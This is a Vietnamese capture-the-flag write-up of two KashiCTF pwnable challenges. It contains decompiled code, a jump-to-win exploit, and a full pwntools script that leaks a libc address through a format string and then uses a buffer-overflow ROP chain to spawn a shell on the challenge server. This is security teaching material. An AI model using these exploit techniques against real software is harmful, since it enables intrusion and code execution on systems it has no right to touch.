---
title: KASHI CTF PWNABLE

---

# KASHI CTF PWNABLE
Thông tin bài làm:
* Em giải lại 2 challenge pwnable của giải là leap_of_faith và TheTrollZone ạ

## leap_of_faith
![{A4E9D15D-7FBF-4AD2-B4F3-041D5D47A239}](https://hackmd.io/_uploads/HyqnGZ5qJx.png)

### IDA
- Tiến hành phân tích chương trình sau khi đã decompile:
- Tại hàm main:
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  __int64 v4; // [rsp+8h] [rbp-8h] BYREF

  printf("i like to jump where ever you say \ngive me the address to go : ");
  __isoc99_scanf("%p", &v4);
  __asm { jmp     rax }
  return result;
}
```
> Sau khi khai báo các biến result, v4 và in ra chuỗi có ý nghĩa là: "Tôi thích nhảy đến nơi nào mà bạn muốn, hãy cho tôi một địa chỉ để nhảy: ", hàm thực hiện lấy dữ liệu đầu vào cho biến v4 với định dạng một địa chỉ (%p).
> Sau đó sử dụng gadget jmp rax để nhảy đến địa chỉ trong thanh ghi rax và sau đó kết thúc hàm.
- Ngoài hàm main, ta còn nhận thấy có tồn tại hàm win:
```
int __fastcall win(int a1, int a2, int a3)
{
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  FILE *stream; // [rsp+78h] [rbp-8h]

  if ( a1 <= 222 || a2 <= 173 || a3 <= 49374 )
  {
    printf("Bro where are the arguments ?");
    exit(69);
  }
  stream = fopen("/flag.txt", "r");
  if ( !stream )
  {
    puts("Failed to open file");
    exit(1);
  }
  if ( fgets(s, 100, stream) )
    printf("flag is : %s", s);
  else
    puts("Failed to read line");
  return fclose(stream);
}
```
>  Hàm được gọi với các tham số a1, a2, a3. Sau khi khai báo mảng kí tự s có 104 phần tử và biến đường dẫn stream thì hàm tiến hành kiểm tra điều kiện là các tham số a1, a2, a3. Nếu điều kiện không được thỏa thì in ra chuỗi "Bro tham số của tui đâu?" và thoát chương trình.
>  Thực thi tiếp việc mở và kiểm tra liệu file flag.txt có tồn tại và sau đó tiến hành đọc 100 byte từ file ra và in ra màn hình. Nếu hành động không hợp lệ thì in ra chuỗi "Thất bại trong việc đọc dòng".

### Ý TƯỞNG
Mục tiêu của chúng ta đó là điều khiển chương trình này đọc flag ra màn hình thông qua hàm win. Vì chương trình có sử dụng jmp rax:
```
call    ___isoc99_scanf
mov     rax, [rbp+var_8]
sub     rsp, 10h
jmp     rax
main endp
```
nên ta sẽ tận dụng điều đó để return vào hàm win đồng thời bypass qua các bước kiểm tra điều kiện tham số bằng cách ta cho nhập vào chương trình địa chỉ thích hợp tại hàm win.

### KHAI THÁC
- Kiểm tra các phương thức bảo mật của chương trình:
![{E5F78DEC-F5B6-46FA-807A-06CD47144032}](https://hackmd.io/_uploads/ryF5Ubcqyx.png)
> Ta thấy rằng địa chỉ đang tĩnh nên với cách khai thác của chúng ta là hiệu quả và tiện lợi để sử dụng trực tiếp một địa chỉ trong chương trình.
- Vậy việc của chúng ta hiện tại là tìm kiếm địa chỉ thích hợp tại win để nhập vào và ta sẽ trực tiếp lấy địa chỉ tại thao tác mở file flag để đọc của chương trình vì tại đó vừa ngay sau các bước kiểm tra và là thao tác cần thiết để ta lấy được flag:
```
.text:00000000004011BA                 lea     rsi, modes      ; "r"
.text:00000000004011C1                 lea     rdi, filename   ; "/flag.txt"
.text:00000000004011C8                 call    _fopen
.text:00000000004011CD                 mov     [rbp+stream], rax
.text:00000000004011D1                 cmp     [rbp+stream], 0
.text:00000000004011D6                 jnz     short loc_4011EE
.text:00000000004011D8                 lea     rdi, s          ; "Failed to open file"
.text:00000000004011DF                 call    _puts
.text:00000000004011E4                 mov     edi, 1          ; status
.text:00000000004011E9                 call    _exit
```
- Như vậy ta thấy toàn bộ thao tác mở file bắt đầu tại địa chỉ 0x4011BA và ta sẽ cho nhập vào chương trình chính xác địa chỉ đó.
- Ta cho chạy trực tiếp trên server:
![{75A11C32-2F9E-4533-B6AD-38670E3030FC}](https://hackmd.io/_uploads/HJbhuW9cye.png)
- Vậy khi ta cho chương trình nhảy luôn đến địa chỉ thực thi open file thì ta thấy chương trình không trả về cho ta gì cả. Điều này xảy ra do khi ta cho nhảy trực tiếp đến địa chỉ trên thì khi thực hiện đến hàm fgets thì dữ liệu được đọc vào sẽ vô tình ghi đè lên các thông số quan trọng như địa chỉ trả về dẫn đến lỗi (bởi vì tại dữ liệu từ file được đọc lên tại rbp-0x70 nhưng tại main rbp chỉ kịp trừ đi 0x10 byte).
- Để giải quyết việc này thì trước khi ta cho chương trình nhảy vào địa chỉ 0x4011ba thì ta sẽ cho chương trì trừ stack đi một lượng vừa đủ để chứa dữ liệu flag đọc vào:
![{A26D9018-4447-4670-B15D-DE2487B76FDE}](https://hackmd.io/_uploads/Hk007Mqcyg.png)
> Sử dụng GDB ta thấy tại main+4 chương trình thực thi việc trừ stack đi 0x10 byte vậy ta sẽ cho chương trình chạy main+4 vài lần để stack có thêm không gian rồi sau đó mới lấy flag.
- Như vậy ta sẽ có file script để nhập vào chương trình:
```
sub_stack = 0x000000000040125e
win = 0x00000000004011ba
for i in range(7):
    p.sendlineafter(b'to go : ',hex(sub_stack))
p.sendlineafter(b'to go : ',hex(win))
```
- Ta cho chạy thử script với server thì:
![{CFF30CC0-0270-434E-AA30-C9C3A73DE284}](https://hackmd.io/_uploads/BykMPzqq1x.png)
- Vậy ta đã nhận được flag là "KashiCTF{m4r10_15_fun_w17H_C_AxIPrxHo}".



## TheTrollZone
![{E00E2816-D4A5-4361-956D-961EF1F5B807}](https://hackmd.io/_uploads/HJRhDfc51g.png)

### IDA
- Ta nhận thấy có 2 hàm cần lưu ý là main và troll.
- Phân tích hàm main:
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[32]; // [rsp+0h] [rbp-20h] BYREF

  setup();
  troll();
  printf("Wanna Cry about that? ");
  gets(v4);                                     // Buffer overflow here
  printf("Still not giving a shit bye hahaha");
  return 0;
}
```
> Thực thi gọi hàm setup và troll. Sau đó tiến hành in ra chuỗi "Muốn khóc vì điều đó không?" và cho người dùng nhập vào không giới hạn vào mảng gồm 32 byte.
> Cuối cùng thực hiện in ra chuỗi "Vẫn chả cho thứ gì đâu bai bai ha ha ha =)))" và kết thúc hàm.
- Ta phân tích hàm troll:
```
int troll()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("What do you want? ");
  fgets(s, 32, stdin);
  if ( !strchr(s, 10) )
  {
    while ( getc(stdin) != 10 )
      ;
  }
  printf("Lmao not giving you ");
  return printf(s);                             // Format string here
}
```
> Hàm tiến hành in ra chuỗi "Bạn muốn gì?" Và sau đó cho ta nhập vào 32 byte vào mảng kí tự s gồm 32 phần tử.
> Sau đó hàm tiến hành xử lí xóa bỏ kí tự xuống dòng trong mảng và in ra chuỗi "Lmao sẽ không cho đâu " và trả về là in ra chuỗi s.

### Ý TƯỞNG
- Với IDA ta nhận thấy rằng không hề tồn tại một hàm nào để ta có thể tạo shell nhưng ta có thể nhận thấy được 2 lỗ hỏng có trong chương trình này là format string ở hàm troll và buffer overflow ở hàm main. (em có command trên code IDA ạ).
- Vậy với 2 lỗ hỏng trên ta sẽ hướng đến việc sử dụng kĩ thuật ret2libc thông qua việc leak được địa chỉ base của libc bằng lỗ hỏng format string và sử dụng lỗ hỏng buffer overflow để ghi đè địa chỉ trả về bằng các gadget có trong file libc để điều khiển các thanh ghi tham số và cuối cùng là hàm system.

### KHAI THÁC
- Thực hiện kiểm tra các phương pháp bảo mật của chương trình:
![{1A6C5D96-60A8-4019-AD9B-F050324157A0}](https://hackmd.io/_uploads/BJgldzfjqyl.png)
> Stack không có canary: ta có thể overflow được.
> No PIE: địa chỉ tĩnh, có thể gọi các hàm.
- Ta tiến hành bước đầu tiên là leak địa chỉ libc.
> Ta khảo sát stack trước khi lần nhập đầu tiên được thực hiện ở hàm troll để xem có tồn tại địa chỉ libc nào để ta leak hay không:
![{F020311B-2662-4A0D-8A78-947E66BF9BF8}](https://hackmd.io/_uploads/SkKOpfs5yx.png)
> Ta thấy rằng trên stack tại rbp+0xd8 đang tồn tại một địa chỉ libc_start_main và ta sẽ tiến hành tính toán để leak được địa chỉ này ra:
> Sử dụng format %p với padding tính toán được là 0x25 ta có script leak địa chỉ libc trên ra:
> ```
> sla(b'What do you want? ',f'%37$p'.encode())
> ```
> Ta cho chạy thử script và địa chỉ trên được leak ra:
> ![{8E3DCCE5-3852-43BB-9BBF-30168AFF9423}](https://hackmd.io/_uploads/BJgvAMjcJe.png)
> Ta tiến hành cho nhận địa chỉ trên vào và tính toán offset đến địa chỉ base. Từ đó ta sẽ bổ sung script để in ra màn hình 2 địa chỉ được leak và base của libc:
> ```
> sla(b'What do you want? ',f'%37$p'.encode())
>
> p.recvuntil(b'giving you ')
> leak= int(p.recvline(),16)
> libc.address = leak - 0x27305
> info("Libc leak = "+hex(leak))
> info("Libc base = "+hex(libc.address))
>```
>![{6130227C-63AC-4A11-AF99-71E5E7CB828B}](https://hackmd.io/_uploads/S1EgyQj9kl.png)
> Để kiểm tra ta sẽ lấy địa chỉ base được tính toán để so với địa chỉ libc base thông qua GDB:
> ![{96B1BF90-CF4F-4650-808D-EFD4C1E60F69}](https://hackmd.io/_uploads/BJA8kXsqyl.png)
> Vậy hiệu giữa địa chỉ được leak và tính toán với địa chỉ base bằng 0 (trùng khớp).
- Sau khi có được địa chỉ gốc của libc, ta tiến hành sử dụng sử dụng lỗ hỏng Buffer Overflow để điều khiển chương trình chạy lệnh system("/bin/sh"). Và ta sẽ hướng đến việc dùng các gadget để điều khiển thanh ghi rdi và gọi hàm system.
> Với địa chỉ libc base, công việc của ta hiện tại chỉ là tìm các offset của gadget pop rdi, ret thông qua việc sử dụng ropper trên chính file libc.so.6:
> ![{73D85BD0-68D3-4D43-B96D-B9D8FAFF1AC3}](https://hackmd.io/_uploads/rko7-msc1x.png)
>  ![{FF184802-3D5F-4F4D-9C8A-A82791912F56}](https://hackmd.io/_uploads/rkGrbQickg.png)
> Vậy ta đã tìm thấy được offset của 2 gadget cần thiết và ta chỉ cần áp dụng vào script nữa là xong:
> ```
> sla(b'What do you want? ',f'%37$p'.encode())
>
> p.recvuntil(b'giving you ')
> leak= int(p.recvline(),16)
> libc.address = leak - 0x27305
> info("Libc leak = "+hex(leak))
> info("Libc base = "+hex(libc.address))
> 
> ret = libc.address + 0x00000000000f655f
> prdi = libc.address + 0x00000000000277e5
> prsi = libc.address + 0x0000000000028f99
> payload = b'a'*40 + p64(ret)+ p64(prdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
> sla(b'Wanna Cry about that? ',payload)
> ```
- Ta tiến hành chạy script:
![{7CF914E9-2D92-4789-BA2A-2FC8C04D41CD}](https://hackmd.io/_uploads/ByLC-Qjq1x.png)
- Vậy khi chạy local thì ta đã lấy được shell.
- Ta tiến hành chạy trên server:
![{2DD48DF5-62F8-4C93-9906-CAEE90CDA08C}](https://hackmd.io/_uploads/rJfEGmo9Je.png)
- Như vậy chạy trên server ta đã lấy được shell và tiến hành cat flag.txt thì server không cho (chắc do giải kết thúc rồi ạ=)) ).
=> Challenge hoàn thành.

### FULL SCRIPT
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('vuln_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+60
        b*main+91
        c
        ''')
        input()


if args.REMOTE:
    p = remote('kashictf.iitbhucybersec.in',56864)
else:
    p = process([exe.path])
GDB()

sla(b'What do you want? ',f'%37$p'.encode())

p.recvuntil(b'giving you ')
leak= int(p.recvline(),16)
libc.address = leak - 0x27305
info("Libc leak = "+hex(leak))
info("Libc base = "+hex(libc.address))

ret = libc.address + 0x00000000000f655f
prdi = libc.address + 0x00000000000277e5
prsi = libc.address + 0x0000000000028f99
payload = b'a'*40 + p64(ret)+ p64(prdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
sla(b'Wanna Cry about that? ',payload)

p.interactive()
```
